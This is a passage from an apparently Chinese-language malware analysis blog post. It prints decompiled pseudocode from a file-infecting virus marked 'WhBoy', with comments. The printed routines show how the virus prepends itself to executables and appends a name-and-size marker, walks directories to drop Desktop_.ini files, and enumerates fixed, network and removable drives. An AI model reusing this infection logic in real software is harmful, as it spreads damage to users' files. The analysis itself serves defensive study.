n11)</span>;<span class="hljs-comment">// 删除字符</span><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)__linkproc__ LStrPos(dword_4087D8, v63) &gt; <span class="hljs-number">0</span> )<span class="hljs-comment">// 查找字符串</span><br>  &#123;<br>    __linkproc__ <span class="hljs-title function_">LStrPos</span><span class="hljs-params">(dword_4087D8, v63)</span>;    <span class="hljs-comment">// 查找字符串</span><br>    System::__linkproc__ <span class="hljs-title function_">LStrCopy</span><span class="hljs-params">(&amp;v60)</span>;        <span class="hljs-comment">// 把被感染的程序名的字符串拷贝，具体是Whboy+程序名</span><br>    System::__linkproc__ <span class="hljs-title function_">LStrDelete</span><span class="hljs-params">(&amp;v60, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>)</span>;<span class="hljs-comment">// 删除拷贝中的Whboy</span><br>    __linkproc__ <span class="hljs-title function_">LStrPos</span><span class="hljs-params">(&amp;dword_4087E4, v60)</span>;   <span class="hljs-comment">// 查找字符串</span><br>    System::__linkproc__ <span class="hljs-title function_">LStrCopy</span><span class="hljs-params">(&amp;v62)</span>;        <span class="hljs-comment">// 把去除了Whboy前缀的字符串拷贝回来</span><br>    n6 = __linkproc__ LStrPos(&amp;dword_4087E4, v60);<span class="hljs-comment">// 查找字符串信息</span><br>    System::__linkproc__ <span class="hljs-title function_">LStrDelete</span><span class="hljs-params">(&amp;v60, <span class="hljs-number">1</span>, n6)</span>;<span class="hljs-comment">// 删除字符串信息</span><br>    v59 = unknown_libname_91(v60);<br>    n128 = (<span class="hljs-type">int</span>)&amp;savedregs;<br>    v32 = &amp;loc_40857A;<br>    ExceptionList = NtCurrentTeb()-&gt;NtTib.ExceptionList;<span class="hljs-comment">// 临时异常记录</span><br>    __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;ExceptionList);<br>    System::__linkproc__ <span class="hljs-title function_">Assign</span><span class="hljs-params">(v58, v62)</span>;      <span class="hljs-comment">// 绑定目标文件路径</span><br>    *off_40E2BC = <span class="hljs-number">2</span>;<br>    n7 = System::__linkproc__ RewritText(v58);  <span class="hljs-comment">// 以写入模式打开当前文件</span><br>    System::__linkproc__ _IOTest(n7);           <span class="hljs-comment">// 测试IO功能</span><br>    unknown_libname_113(v64);                   <span class="hljs-comment">// 读取被感染病毒文件的大小</span><br>    System::__linkproc__ <span class="hljs-title function_">LStrCopy</span><span class="hljs-params">(&amp;v44)</span>;        <span class="hljs-comment">// 将源文件从被感染的文件中提取出来</span><br>    n12 = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v58, v44);<span class="hljs-comment">// 以附加方式写入，使被感染的文件被刷新成未被感染的文件</span><br>    n13 = System::__linkproc__ Flush(n12);      <span class="hljs-comment">// 刷新缓冲区</span><br>    System::__linkproc__ _IOTest(n13);<br>    v15 = System::__linkproc__ Close(v58);<br>    System::__linkproc__ _IOTest(v15);<br>    __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)ExceptionList);<br>    writebatfile();                             <span class="hljs-comment">// 生成bat文件并运行，删除旧文件，直接跳到下面结束进程</span><br></code></pre></td></tr></table></figure><h2 id="sub-0x40d18c"><a href="#sub-0x40d18c" class="headerlink" title="sub_0x40d18c"></a>sub_0x40d18c</h2><h3 id="sub-40a5b0"><a href="#sub-40a5b0" class="headerlink" title="sub_40a5b0"></a>sub_40a5b0</h3><p>创建了多线程</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002094944.png"></p><p>进去一看，是个循环遍历的操作</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002103717.png"></p><h4 id="sub-409348"><a href="#sub-409348" class="headerlink" title="sub_409348"></a>sub_409348</h4><p>好家伙，进去一看全是各种文件夹字符串</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002103838.png"></p><p>定位到核心代码段，所以可得此处功能为遍历目录，创建Desktop_.ini</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c">      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(v94, <span class="hljs-number">3</span>)</span>;<br>      <span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> __int8)Sysutils::FileExists(v94[<span class="hljs-number">0</span>]) )<span class="hljs-comment">// 当前目录下是否存在Desktop_.ini，若不存在</span><br>      &#123;<br>        n128_3 = <span class="hljs-number">128</span>;<br>        System::AnsiString_1 = n128_1;<br>        ExceptionList = (<span class="hljs-keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD *)System::AnsiString;<br>        __Desktop_.ini = (<span class="hljs-type">int</span> *)aDesktopIni_1;  <span class="hljs-comment">// &quot;\\Desktop_.ini&quot;</span><br>        System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v82, <span class="hljs-number">3</span>)</span>; <span class="hljs-comment">// 路径拼接</span><br>        lpFileName = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v82);<br>        SetFileAttributesA(lpFileName, (DWORD)ExceptionList);<span class="hljs-comment">// 设置属性</span><br>        Sleep(<span class="hljs-number">1u</span>);<br>        GetLocalTime(&amp;SystemTime);              <span class="hljs-comment">// 获取当前时间</span><br>        sub_40576C(SystemTime.wYear, (<span class="hljs-type">int</span>)&amp;ExceptionList_2);<span class="hljs-comment">// 年</span><br>        ExceptionList = ExceptionList_2;<br>        __Desktop_.ini = _Desktop__ini;<br>        sub_40576C(SystemTime.wMonth, (<span class="hljs-type">int</span>)&amp;__Desktop_.ini_3);<span class="hljs-comment">// 月</span><br>        __Desktop_.ini_2 = __Desktop_.ini_3;<br>        ExceptionList_1 = (<span class="hljs-keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD *)_Desktop__ini;<br>        sub_40576C(SystemTime.wDay, (<span class="hljs-type">int</span>)&amp;dwFileAttributes_3);<span class="hljs-comment">// 日</span><br>        dwFileAttributes_1 = dwFileAttributes_3;<br>        System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v101, <span class="hljs-number">5</span>)</span>;<br>        System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v78, <span class="hljs-number">3</span>)</span>;<br>        Mxdsql::ShowSQLWindow(v101, v78);       <span class="hljs-comment">// 创建并写入日期</span><br>        System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v77, <span class="hljs-number">3</span>)</span>;<br>        lpFileName_1 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v77);<br>        SetFileAttributesA(lpFileName_1, dwFileAttributes_1);<span class="hljs-comment">// 设置文件属性</span><br>        Sleep(<span class="hljs-number">1u</span>);<br>LABEL_32:<br>        System::__linkproc__ <span class="hljs-title function_">LStrCat3</span><span class="hljs-params">(&amp;n128, n128_1, System::AnsiString)</span>;<br>        sub_409348(n128, a2, a3, a4);           <span class="hljs-comment">// 自循环</span><br>LABEL_59:<br>        Sleep(<span class="hljs-number">0x14</span>u);<br>        <span class="hljs-keyword">goto</span> LABEL_60;<br>      &#125;                                         <span class="hljs-comment">// 此处是存在Desktop_.ini，把其时间读取，与当前时间比对，若不相等，写入当前时间</span><br>      n128_3 = (<span class="hljs-type">int</span>)n128_1;<br>      System::AnsiString_1 = (<span class="hljs-type">char</span> *)System::AnsiString;<br>      ExceptionList = (<span class="hljs-keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD *)aDesktopIni_1;<span class="hljs-comment">// &quot;\\Desktop_.ini&quot;</span><br>      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v93, <span class="hljs-number">3</span>)</span>;<br>      sub_407650(v93, &amp;v102, a2, a3, a4);<br>      GetLocalTime(&amp;SystemTime);<br>      sub_40576C(SystemTime.wYear, (<span class="hljs-type">int</span>)&amp;System::AnsiString_2);<br>      System::AnsiString_1 = System::AnsiString_2;<br>      ExceptionList = (<span class="hljs-keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD *)_Desktop__ini;<span class="hljs-comment">// 获取时间</span><br>      sub_40576C(SystemTime.wMonth, (<span class="hljs-type">int</span>)&amp;__Desktop_.ini_1);<br>      __Desktop_.ini = __Desktop_.ini_1;<br>      __Desktop_.ini_2 = _Desktop__ini;<br>      sub_40576C(SystemTime.wDay, (<span class="hljs-type">int</span>)&amp;ExceptionList_3);<br>      ExceptionList_1 = ExceptionList_3;<br>      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v101, <span class="hljs-number">5</span>)</span>;<br>      System::__linkproc__ <span class="hljs-title function_">LStrCmp</span><span class="hljs-params">(v102, v101)</span>;<br>      <span class="hljs-keyword">if</span> ( !v5 )<br>      &#123;<br>        System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v88, <span class="hljs-number">3</span>)</span>;<br>        lpFileName_2 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v88);<br>        SetFileAttributesA(lpFileName_2, <span class="hljs-number">0x80</span>u);<br>        Sleep(<span class="hljs-number">1u</span>);<br>        GetLocalTime(&amp;SystemTime);<br>        sub_40576C(SystemTime.wYear, (<span class="hljs-type">int</span>)&amp;dwFileAttributes);<br>        dwFileAttributes_2 = dwFileAttributes;<br>        sub_40576C(SystemTime.wMonth, (<span class="hljs-type">int</span>)&amp;v86);<br>        sub_40576C(SystemTime.wDay, (<span class="hljs-type">int</span>)&amp;v85);<br>        System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v101, <span class="hljs-number">5</span>)</span>;<br>        System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v84, <span class="hljs-number">3</span>)</span>;<br>        Mxdsql::ShowSQLWindow(v101, v84);<br>        System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v83, <span class="hljs-number">3</span>)</span>;<br>        lpFileName_3 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v83);<br>        SetFileAttributesA(lpFileName_3, dwFileAttributes_2);<br>        Sleep(<span class="hljs-number">1u</span>);<br>        <span class="hljs-keyword">goto</span> LABEL_32;<br>      &#125;<br>      System::__linkproc__ <span class="hljs-title function_">LStrCat3</span><span class="hljs-params">(&amp;v89, n128_1, System::AnsiString)</span>;<br>      sub_4087E8(v89);                          <span class="hljs-comment">// 另一个自循环</span><br></code></pre></td></tr></table></figure><h4 id="sub-407f00"><a href="#sub-407f00" class="headerlink" title="sub_407f00"></a>sub_407f00</h4><p>看到这个0xa00000警觉起来，大于10Mb大小的文件没有被感染，于是猜测感染的核心代码就在附近</p><p>最终定位到函数sub_0x7f00</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002182511.png"></p><p>分析感染行为，在被感染程序前插入源病毒，文件尾加上特征后缀”whboy”+被感染程序原名称+”.exe”+”\x02”+文件大小+“\x01”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __usercall sub_407F00@&lt;eax&gt;(<span class="hljs-type">int</span> a1@&lt;eax&gt;, <span class="hljs-type">int</span> Buffer@&lt;ebx&gt;, <span class="hljs-type">int</span> Servername@&lt;edi&gt;, <span class="hljs-type">int</span> a4@&lt;esi&gt;)<br>&#123;<br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// zf</span><br>  <span class="hljs-type">const</span> CHAR *lpFileName; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">const</span> CHAR *lpExistingFileName; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v15[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [esp-18h] [ebp-214h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v16[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [esp-Ch] [ebp-208h] BYREF</span><br>  <span class="hljs-type">int</span> *v17; <span class="hljs-comment">// [esp-4h] [ebp-200h]</span><br>  <span class="hljs-type">int</span> v18; <span class="hljs-comment">// [esp+Ch] [ebp-1F0h] BYREF</span><br>  <span class="hljs-type">int</span> v19; <span class="hljs-comment">// [esp+10h] [ebp-1ECh] BYREF</span><br>  <span class="hljs-type">int</span> v20; <span class="hljs-comment">// [esp+14h] [ebp-1E8h]</span><br>  <span class="hljs-type">int</span> v21; <span class="hljs-comment">// [esp+18h] [ebp-1E4h]</span><br>  <span class="hljs-type">int</span> v22; <span class="hljs-comment">// [esp+1Ch] [ebp-1E0h] BYREF</span><br>  _BYTE v23[<span class="hljs-number">460</span>]; <span class="hljs-comment">// [esp+20h] [ebp-1DCh] BYREF</span><br>  <span class="hljs-type">int</span> v24; <span class="hljs-comment">// [esp+1ECh] [ebp-10h] BYREF</span><br>  <span class="hljs-type">int</span> v25; <span class="hljs-comment">// [esp+1F0h] [ebp-Ch] BYREF</span><br>  _BYTE *v26; <span class="hljs-comment">// [esp+1F4h] [ebp-8h] BYREF</span><br>  <span class="hljs-type">int</span> v27; <span class="hljs-comment">// [esp+1F8h] [ebp-4h]</span><br>  <span class="hljs-type">int</span> savedregs; <span class="hljs-comment">// [esp+1FCh] [ebp+0h] BYREF</span><br><br>  v19 = <span class="hljs-number">0</span>;<br>  v18 = <span class="hljs-number">0</span>;<br>  v20 = <span class="hljs-number">0</span>;<br>  v21 = <span class="hljs-number">0</span>;<br>  v22 = <span class="hljs-number">0</span>;<br>  v26 = <span class="hljs-number">0</span>;<br>  v25 = <span class="hljs-number">0</span>;<br>  v24 = <span class="hljs-number">0</span>;<br>  v27 = a1;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAddRef</span><span class="hljs-params">(a1)</span>;<br>  v17 = &amp;savedregs;<br>  v16[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_408145;<br>  v16[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v16);<br>  v15[<span class="hljs-number">2</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;savedregs;<br>  v15[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_408110;<br>  v15[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v15);<br>  sub_405534(v27, &amp;v22);                        <span class="hljs-comment">// 读取目标程序文件名</span><br>  <span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> __int8)sub_4077B4(v22) )<br>  &#123;<br>    System::Randomize();<br>    System::ParamStr(<span class="hljs-number">0</span>);                        <span class="hljs-comment">// 获取源病毒程序路径</span><br>    System::__linkproc__ <span class="hljs-title function_">LStrCmp</span><span class="hljs-params">(v27, v21)</span>;     <span class="hljs-comment">// 比较，若不相等</span><br>    <span class="hljs-keyword">if</span> ( !v4 )<br>    &#123;<br>      System::__linkproc__ <span class="hljs-title function_">LStrClr</span><span class="hljs-params">(&amp;v26)</span>;<br>      sub_407650(v27, (<span class="hljs-type">int</span> *)&amp;v26, Buffer, Servername, a4);<span class="hljs-comment">// 读取要感染的文件内容到内存中</span><br>      <span class="hljs-keyword">if</span> ( v26 )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)__linkproc__ LStrPos(<br>                    aWhboy,                     <span class="hljs-comment">// &quot;WhBoy&quot;</span><br>                    v26) &lt;= <span class="hljs-number">0</span> )<br>        &#123;<br>          lpFileName = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v27);<br>          SetFileAttributesA(lpFileName, <span class="hljs-number">0x80</span>u);<span class="hljs-comment">// 设置文件属性为正常</span><br>          Sleep(<span class="hljs-number">1u</span>);<br>          System::ParamStr(<span class="hljs-number">0</span>);<br>          lpExistingFileName = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v20);<br>          <span class="hljs-keyword">if</span> ( CopyFileA(lpExistingFileName, lpFileName, <span class="hljs-number">0</span>) )<span class="hljs-comment">// 把源病毒程序复制给目标程序，此时完成感染</span><br>          &#123;<br>            sub_405534(v27, &amp;v19);<br>            v7 = unknown_libname_113((<span class="hljs-type">int</span>)v26);<br>            sub_40576C(v7, (<span class="hljs-type">int</span>)&amp;v18);<br>            System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v24, <span class="hljs-number">6</span>)</span>;<br>            System::__linkproc__ <span class="hljs-title function_">LStrLAsg</span><span class="hljs-params">(&amp;v25, v26)</span>;<br>            System::__linkproc__ <span class="hljs-title function_">Assign</span><span class="hljs-params">(v23, v27)</span>;<br>            *off_40E2BC = <span class="hljs-number">2</span>;<br>            v8 = System::__linkproc__ Append(v23);<br>            System::__linkproc__ _IOTest(v8);<br>            v9 = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v23, v25);<span class="hljs-comment">// 把源文件内容接着写到被感染文件的后面</span><br>            v10 = System::__linkproc__ Flush(v9);<br>            System::__linkproc__ _IOTest(v10);<br>            v11 = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v23, v24);<span class="hljs-comment">// 写入后缀，格式为&quot;whboy&quot;+被感染程序原名称+&quot;.exe&quot;+&quot;\x02&quot;+文件大小+“\x01&quot;</span><br>            v12 = System::__linkproc__ Flush(v11);<br>            System::__linkproc__ _IOTest(v12);<br>            v13 = System::__linkproc__ Close(v23);<br>            System::__linkproc__ _IOTest(v13);<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  __writefsdword(<span class="hljs-number">0</span>, v15[<span class="hljs-number">0</span>]);<br>  __writefsdword(<span class="hljs-number">0</span>, v16[<span class="hljs-number">0</span>]);<br>  System::__linkproc__ <span class="hljs-title function_">LStrArrayClr</span><span class="hljs-params">(&amp;loc_40814C)</span>;<br>  <span class="hljs-keyword">return</span> System::__linkproc__ LStrArrayClr(v17);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002182155.png"></p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002183135.png"></p><h3 id="sub-40c374"><a href="#sub-40c374" class="headerlink" title="sub_40c374"></a>sub_40c374</h3><p>设置了一个定时器，点进去看看</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002084452.png"></p><h4 id="sub-40bc88"><a href="#sub-40bc88" class="headerlink" title="sub_40bc88"></a>sub_40bc88</h4><p>本函数的功能为遍历盘符，获取可用的，故重命名为GetRootPath</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __usercall GetRootPath@&lt;eax&gt;(<br>        <span class="hljs-type">int</span> a1@&lt;eax&gt;,<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a2@&lt;ebx&gt;,<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a3@&lt;edi&gt;,<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> lpFileName@&lt;esi&gt;)<br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">const</span> CHAR *lpRootPathName; <span class="hljs-comment">// eax</span><br>  __int16 DriveTypeA; <span class="hljs-comment">// ax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v9[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [esp-18h] [ebp-24h] BYREF</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [esp+0h] [ebp-Ch] BYREF</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [esp+4h] [ebp-8h] BYREF</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [esp+8h] [ebp-4h] BYREF</span><br>  <span class="hljs-type">int</span> savedregs; <span class="hljs-comment">// [esp+Ch] [ebp+0h] BYREF</span><br><br>  v12 = <span class="hljs-number">0</span>;<br>  v11 = <span class="hljs-number">0</span>;<br>  v10 = <span class="hljs-number">0</span>;<br>  v9[<span class="hljs-number">5</span>] = a2;<br>  v9[<span class="hljs-number">4</span>] = lpFileName;<br>  v9[<span class="hljs-number">3</span>] = a3;<br>  v9[<span class="hljs-number">2</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;savedregs;<br>  v9[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_40BD18;<br>  v9[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v9);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i != <span class="hljs-number">26</span>; ++i )                   <span class="hljs-comment">// 遍历盘符A-Z</span><br>  &#123;<br>    unknown_libname_108((<span class="hljs-type">int</span>)&amp;v11);<br>    System::__linkproc__ <span class="hljs-title function_">LStrCat3</span><span class="hljs-params">(&amp;v12, v11, sub_40BD30)</span>;<br>    lpRootPathName = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v12);<br>    DriveTypeA = GetDriveTypeA(lpRootPathName); <span class="hljs-comment">// 获取盘符属性</span><br>    <span class="hljs-keyword">if</span> ( DriveTypeA == <span class="hljs-number">3</span> || DriveTypeA == <span class="hljs-number">4</span> || DriveTypeA == <span class="hljs-number">2</span> )<span class="hljs-comment">// DriveTypeA == 3 || DriveTypeA == 4 || DriveTypeA == 2（即 DRIVE_FIXED、DRIVE_REMOTE、DRIVE_REMOVABLE）</span><br>                                                <span class="hljs-comment">// 盘符属性符合则记录</span><br>    &#123;<br>      unknown_libname_108((<span class="hljs-type">int</span>)&amp;v10);<br>      System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(a1, v10)</span>;<br>    &#125;<br>  &#125;<br>  __writefsdword(<span class="hljs-number">0</span>, v9[<span class="hljs-number">0</span>]);<br>  <span class="hljs-keyword">return</span> System::__linkproc__ LStrArrayClr(&amp;loc_40BD1F);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="sub-40bd34"><a href="#sub-40bd34" class="headerlink" title="sub_40bd34"></a>sub_40bd34</h4><p>此函数的作用是打开文件并读取进程序内存，故重命名为OpenAndRead_File</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 